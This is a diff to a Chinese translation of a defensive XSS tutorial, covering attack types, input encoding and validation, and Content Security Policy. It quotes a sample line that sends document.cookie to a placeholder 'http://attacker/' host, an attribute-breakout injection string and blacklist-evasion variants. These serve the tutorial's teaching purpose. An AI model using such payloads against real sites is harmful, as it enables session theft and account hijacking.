@@ -1,3 +1,14 @@
+一份关于 XSS 的综合教程。
+
+原文地址：[http://excess-xss.com/](http://excess-xss.com/)。如有翻译不当之处，欢迎指出 :D
+
+分为四部分：
+
+- 概述
+- XSS 攻击
+- XSS 防御
+- 总结
+
 ## 第一部分：概述
 
 ### XSS 是什么
@@ -27,7 +38,7 @@ Latest comment:
 </html>
 ```
 
-当用户浏览器加载了该页面，就会执行 `<script>` 标签中所有 JavaScript 代码。攻击者就实现了它的攻击。
+当用户浏览器加载了该页面，就会执行 `<script>` 标签中所有 JavaScript 代码。攻击者就实现了他的攻击。
 
 
 ### 恶意 JavaScript 是什么
@@ -46,9 +57,9 @@ Latest comment:
 
 在其它用户浏览器中执行任意 JavaScript 的能力，使得攻击者可以进行下面几种攻击：
 
-- 盗取 Cookie：攻击者使用 `document.cookie` 可以获取受害者与网站关联的 cookie，将其发送到自己的服务器，并利用 cookie 提取敏感信息，例如 session IDs。
-- 键盘记录：攻击者使用 `addEventListener` 可以注册键盘事件监听，然后将用户所有的键盘记录发送到自己的服务器，这里面可能会包含敏感信息，例如：密码或信用卡号。
-- 钓鱼：攻击者使用 DOM 操作可以插入一个伪造的登录表单，将表单的 `action` 属性设置为自己的服务器地址，然后欺骗用户提交敏感信息。
+- **盗取 Cookie**：攻击者使用 `document.cookie` 可以获取受害者与网站关联的 cookie，将其发送到自己的服务器，并利用 cookie 提取敏感信息，例如 session IDs。
+- **键盘记录**：攻击者使用 `addEventListener` 可以注册键盘事件监听，然后将用户所有的键盘记录发送到自己的服务器，这里面可能会包含敏感信息，例如：密码或信用卡号。
+- **钓鱼**：攻击者使用 DOM 操作可以插入一个伪造的登录表单，将表单的 `action` 属性设置为自己的服务器地址，然后欺骗用户提交敏感信息。
 
 尽管这几种攻击方式大不相同，但有个关键点是相同的：由于攻击者是在网站提供的页面中注入的代码，所以恶意 JavaScript 会在网站的上下文中执行。这意味着，恶意 JavaScript 与来自网站的其它脚本待遇相同：它可以访问该网站上受害者的数据（例如：cookie）和 URL 地址栏中的主机名。不论出于何种目的，被注入的脚本会被看成网站合法的一部分，网站可以做的事，它同样可以做。
 
@@ -62,13 +73,13 @@ Latest comment:
 
 ### XSS 攻击涉及到的角色
 
-在详细介绍 XSS 攻击如何进行之前，需要定义 XSS 中涉及到的角色。通常，一次 XSS 会涉及三个角色：网站、受害者和攻击者。
+在详细介绍 XSS 攻击如何进行之前，需要定义 XSS 中涉及到的角色。通常，一次 XSS 会涉及三个角色：**网站**、**受害者**和**攻击者**。
 
-- 网站响应 HTML 页面给发起请求的用户。在我们的例子中，网站是 http://website/。
-	- 网站的数据库用来存储一些用户的输入，并输出到网站页面中。
-- 受害者是网站的普通用户，通过浏览器请求页面。
-- 攻击者是网站的恶意用户，准备利用网站的 XSS 漏洞发起攻击
-	- 攻击者的服务器是由攻击者控制，唯一的用途是盗取用户敏感信息。在我们的例子中，位于 http://attacker/ 
+- **网站**响应 HTML 页面给发起请求的用户。在我们的例子中，网站是 http://website/。
+	- **网站的数据库**用来存储一些用户的输入，并输出到网站页面中。
+- **受害者**是网站的普通用户，通过浏览器请求页面。
+- **攻击者**是网站的恶意用户，准备利用网站的 XSS 漏洞发起攻击
+	- **攻击者的服务器**是由攻击者控制，唯一的用途是盗取用户敏感信息。在我们的例子中，位于 http://attacker/ 
 	
 
 ### 一次攻击示例
@@ -88,6 +99,8 @@ window.location='http://attacker/?cookie='+document.cookie
 
 下图展示了攻击者如何进行攻击：
 
+![persistent-xss](http://excess-xss.com/persistent-xss.png)
+
 1. 攻击者利用网站的表单插入恶意字符串到网站数据库中。
 2. 受害者从网站中请求页面。
 3. 网站在响应中包含了来自数据库的恶意字符串，并返回给受害者。
@@ -97,15 +110,17 @@ window.location='http://attacker/?cookie='+document.cookie
 
 尽管 XSS 攻击的目标都是在受害者浏览器中执行恶意 JavaScript，还是有几种完全不同的方式来实现该目标的。XSS 攻击通常可以分为三类：
 
-- 存储型 XSS（Persistent XSS），恶意字符串来自网站数据库
-- 反射型 XSS（Reflected XSS），恶意字符串来自受害者的请求
-- DOM 型 XSS（DOM-based XSS），漏洞位于客户端代码而不是服务端代码
+- **存储型 XSS（Persistent XSS）**，恶意字符串来自网站数据库
+- **反射型 XSS（Reflected XSS）**，恶意字符串来自受害者的请求
+- **DOM 型 XSS（DOM-based XSS）**，漏洞位于客户端代码而不是服务端代码
 
 前面的例子展示了存储型 XSS 攻击。接下来介绍另外两种：反射型 XSS 和 DOM 型 XSS。
 
 ### 反射型 XSS
 
 在反射型 XSS 中，恶意字符串是受害者向网站发起的请求的一部分。然后，网站将包含恶意字符串的响应返回给了受害者。如下图所示：
+
+![reflected-xss](http://excess-xss.com/reflected-xss.png)
 
 1. 攻击者精心构造了一个包含恶意字符串的 URL，将其发送给受害者
 2. 攻击者欺骗受害者，使其访问了该 URL
@@ -128,6 +143,8 @@ window.location='http://attacker/?cookie='+document.cookie
 
 DOM XSS 是存储型 XSS 和 反射型 XSS 的变种。在 DOM XSS 攻击中，一直到页面运行了 JavaScript，恶意字符串才被实际的解析。 
 下图展示了 DOM XSS 攻击。
+
+![dom-based-xss](http://excess-xss.com/dom-based-xss.png)
 
 1. 攻击者精心构造了一个包含恶意字符串的 URL，将其发送给受害者。
 2. 攻击者欺骗受害者，使其访问了该 URL
@@ -166,20 +183,28 @@ DOM XSS 是存储型 XSS 和 反射型 XSS 的变种。在 DOM XSS 攻击中，�
 
 记住，XSS 攻击是一种代码注入：用户输入被错误的解释为恶意程序代码。为了防止这种类型的代码注入，需要对输入进行安全处理。对 web 开发者而言，可以采用两种不同的方式：
 
-- 编码，转义用户输入，这样浏览器就只会将其解释为数据而不是代码。
-- 校验，过滤用户输入，这样浏览器就可以将其解释为没有恶意命令的代码。
+- **编码**，转义用户输入，这样浏览器就只会将其解释为数据而不是代码。
+- **校验**，过滤用户输入，这样浏览器就可以将其解释为没有恶意命令的代码。
 
 尽管这两种方式有着本质的区别，但是它们还是存在共同点，在使用过程中，理解这些共同点很重要：
 
-- 上下文：根据用户输入在页面中插入位置的不同，需要进行不同的安全处理
-- 流入/流出（inbound/outbound）：安全处理要么在网站接收输入时（inbound）进行，要么在网站将输入到插入页面之前（outbound）进行
-- 客户端/服务端：安全处理可以在客户端进行，也可以在服务端进行。在某些情况下，需要在客户端和服务端同时进行安全处理。
+- **上下文**：根据用户输入在页面中插入位置的不同，需要进行不同的安全处理
+- **流入/流出（inbound/outbound）**：安全处理要么在网站接收输入时（inbound）进行，要么在网站将输入到插入页面之前（outbound）进行
+- **客户端/服务端**：安全处理可以在客户端进行，也可以在服务端进行。在某些情况下，需要在客户端和服务端同时进行安全处理。
 
 在详细介绍如何进行编码和校验之前，我们先来逐个解释以上三点。
 
-#### 输入处理上下文
+#### 输入处理的上下文
 
 在网页中，用户输入可能插入的地方有很多。每个地方的上下文不同，要遵循指定规则才能保证用户输入不会打破上下文，被解释为恶意代码。下面是常见的上下文：
+
+|上下文 |示例代码 |
+|----|:---:|
+|HTML element content|	`<div>userInput</div>`
+|HTML attribute value|	`<input value="userInput">`
+|URL query value|	`http://example.com/?parameter=userInput`
+|CSS value	|`color: userInput`
+|JavaScript value	|`var name = "userInput";`
 
 ##### 为什么上下文很重要
 
@@ -187,10 +212,14 @@ DOM XSS 是存储型 XSS 和 反射型 XSS 的变种。在 DOM XSS 攻击中，�
 
 例如，如果某个站点将用户输入直接插入到 HTML 属性中，攻击者通过以引号作为开头的输入就可以注入恶意脚本，如下所示：
 
+|Application code|	`<input value="userInput">`|
+|----|:---:|
+|Malicious string|	`"><script>...</script><input value="`|
+|Resulting code|	`<input value=""><script>...</script><input value="">`|
 
 只需移除用户输入中的所有引号就可以避免上面的 XSS，但这只对该上下文有效。如果相同的输入插入到其它的上下文，结束分隔符可能就不同，又可能导致注入。所以说，需要根据用户输入插入点的上下文，进行不同的安全处理。
 
-#### 流入/流出（inbound/outbound）输入处理
+#### 流入/流出（inbound/outbound）的输入处理
 
 仅凭直觉，似乎只需在网站接收到用户输入时，对其进行编码或是校验就可以防止 XSS。用这种方式，任何恶意代码插入到页面中的时候都已经失效了，生成 HTML 的脚本就无需关心安全处理。
 
@@ -242,6 +271,13 @@ Latest comment:
 
 当在客户端使用 JavaScript 编码用户输入时，有一些内置的方法和属性会自动根据上下文进行编码：
 
+|上下文 |方法、属性|
+|----|:---:|
+| HTML element content	| `node.textContent = userInput`|
+|HTML attribute value|`element.setAttribute(attribute, userInput)` or `element[attribute] = userInput` |
+| URL query value	| `window.encodeURIComponent(userInput)`|
+| CSS value| `element.style.property = userInput`|
+
 前面提到的最后一种上下文（JavaScript values）并不包含在内，because JavaScript provides no built-in way of encoding data to be included in JavaScript source code.
 
 #### 编码的局限性
@@ -264,8 +300,8 @@ document.querySelector('a').href = userInput
 
 根据实现方式的不同，主要有两种典型的校验方法：
 
-- 分类策略（Classification strategy）：使用黑名单或白名单对用户输入进行分类。
-- validation outcome：被确认为有恶意的用户输入，可以选择拒绝或是净化。
+- **分类策略（Classification strategy）**：使用黑名单或白名单对用户输入进行分类。
+- **validation outcome**：被确认为有恶意的用户输入，可以选择拒绝或是净化。
 
 #### 分类策略（Classification strategy）
 
@@ -275,8 +311,8 @@ document.querySelector('a').href = userInput
 
 但是，黑名单有两大缺点：
 
-- 复杂：准确的描述所有可能的恶意字符串的集合通常是一项非常复杂的任务。上面例子中，通过简单地搜索子字符串 "javascript:" 来实现是不行的，因为这会漏掉字符串的其它变种，例如： `"Javascript:"`（首字母大写）和 `"&#106;avascript:"`(首字母编码成了字符引用)
-- 容易失效：即使开发出了完美的黑名单，一旦浏览器增加了允许恶意用户使用的新特性，黑名单就失效了。例如，在 HTML5 onmousewheel 属性出现之前开发的 HTML 验证黑名单，就不能防御使用该属性进行的 XSS 攻击。这个缺点在 WEB 开发中尤其明显，因为使用到的多种技术都在不断地更新中。
+- **复杂**：准确的描述所有可能的恶意字符串的集合通常是一项非常复杂的任务。上面例子中，通过简单地搜索子字符串 "javascript:" 来实现是不行的，因为这会漏掉字符串的其它变种，例如： `"Javascript:"`（首字母大写）和 `"&#106;avascript:"`(首字母编码成了字符引用)
+- **容易失效**：即使开发出了完美的黑名单，一旦浏览器增加了允许恶意用户使用的新特性，黑名单就失效了。例如，在 HTML5 onmousewheel 属性出现之前开发的 HTML 验证黑名单，就不能防御使用该属性进行的 XSS 攻击。这个缺点在 WEB 开发中尤其明显，因为使用到的多种技术都在不断地更新中。
 
 由于这些缺点，强烈反对使用黑名单作为分类策略。通常，白名单是一种更加安全的方式。
 
@@ -288,19 +324,19 @@ document.querySelector('a').href = userInput
 
 和黑名单相比，白名单的两大优点是：
 
-- 简单：通常，准确的描述一个安全的字符串的集合要比定义一个包含所有恶意字符串的集合要简单很多。尤其是，在一般情况下，用户输入只需是浏览器功能的有限子集时更是如此。例如，用于描述上面只允许 http: 或 https: 协议的 URL 的白名单是很简单的，并且在大多数情况下完全够用。
-- 持久性：不像黑名单，当有浏览器增加新特性时，白名单一般不会失效。例如：一个 HTML 校验白名单只允许 HTML 元素上出现 title 属性，即使 HTML5 新增了 onmousewheel 属性，白名单依然有效。
+- **简单**：通常，准确的描述一个安全的字符串的集合要比定义一个包含所有恶意字符串的集合要简单很多。尤其是，在一般情况下，用户输入只需是浏览器功能的有限子集时更是如此。例如，用于描述上面只允许 http: 或 https: 协议的 URL 的白名单是很简单的，并且在大多数情况下完全够用。
+- **持久性**：不像黑名单，当有浏览器增加新特性时，白名单一般不会失效。例如：一个 HTML 校验白名单只允许 HTML 元素上出现 title 属性，即使 HTML5 新增了 onmousewheel 属性，白名单依然有效。
 
 #### Validation outcome
 
 当输入被标记为非法，可以采取两种行为：
 
-- 拒绝：简单粗暴的拒绝该输入，阻止其在网站的任何地方使用
-- 净化：移除所有非法部分，剩余部分正常用在网站中
+- **拒绝**：简单粗暴的拒绝该输入，阻止其在网站的任何地方使用
+- **净化**：移除所有非法部分，剩余部分正常用在网站中
 
 两种方式中，拒绝最容易实现。话虽如此，净化通常更有用，因为它允许用户的输入范围更广。例如，如果一个用户提交信用卡号，净化过程中通过移除所有非数字字符来防止代码注入，同时可以允许用户在数字间使用连字符。
 
-如果你决定使用净化，必须保证净化过程本身没有使用黑名单的方式。例如：即使 URL`"Javascript:..."`被白名单标记为非法，只需移除所有的 `"Javascript:"` 还是可以使其通过净化流程。因此，测试完备的库和框架还是应该尽可能的使用净化。
+如果你决定使用净化，必须[保证净化过程本身没有使用黑名单的方式](todo)。例如：即使 URL`"Javascript:..."`被白名单标记为非法，只需移除所有的 `"Javascript:"` 还是可以使其通过净化流程。因此，测试完备的库和框架还是应该尽可能的使用净化。
 
 ### 选用哪种方法
 
@@ -318,9 +354,9 @@ CSP 用来限制浏览器 viewing your page 保证其只能使用从可信任的
 
 CSP 可以用来强制实施下面的规则：
 
-- No untrusted sources：外部资源只能从一个明确定义的可信源集合中加载
-- No inline resources：不执行行内（inline） JavaScript 和 CSS
-- No eval：不可以使用 JavaScript 函数 eval
+- **No untrusted sources**：外部资源只能从一个明确定义的可信源集合中加载
+- **No inline resources**：不执行行内（inline） JavaScript 和 CSS
+- **No eval**：不可以使用 JavaScript 函数 eval
 
 #### 应用 CSP
 
@@ -360,8 +396,8 @@ Content‑Security‑Policy:
 
 由两个元素构成：
 
-- 指令：声明资源类型的字符串，从预定义列表中取值。
-- 来源表达式（Source expressions）：描述可以用于下载资源的一个或多个服务器的模式
+- **指令**：声明资源类型的字符串，从预定义列表中取值。
+- **来源表达式（Source expressions）**：描述可以用于下载资源的一个或多个服务器的模式
 
 对每个指令来说，给定的来源表达式定义了该资源类型可以使用哪些来源下载资源。
 
@@ -392,10 +428,10 @@ protocol://host‑name:port‑number
 
 除此之外，来源表达式还可以是下面四个有特殊含义的关键词之一（包含引号）：
 
-- 'none'：不允许该类型资源
-- 'self'：允许从提供当前页面的主机下载资源
-- 'unsafe-inline'：允许在页面中嵌入资源，例如：行内 `<script>` 元素，`<style>` 元素和 javascript: URL。
-- 'unsafe-eval'：允许使用 JavaScript eval 函数
+- **'none'**：不允许该类型资源
+- **'self'**：允许从提供当前页面的主机下载资源
+- **'unsafe-inline'**：允许在页面中嵌入资源，例如：行内 `<script>` 元素，`<style>` 元素和 javascript: URL。
+- **'unsafe-eval'**：允许使用 JavaScript eval 函数
 
 需要注意的是，一旦启用 CSP，默认情况下，行内资源和 eval 是自动被禁止的。使用它们的唯一方式就是使用 'unsafe-inline' 和 'unsafe-eval'。
 
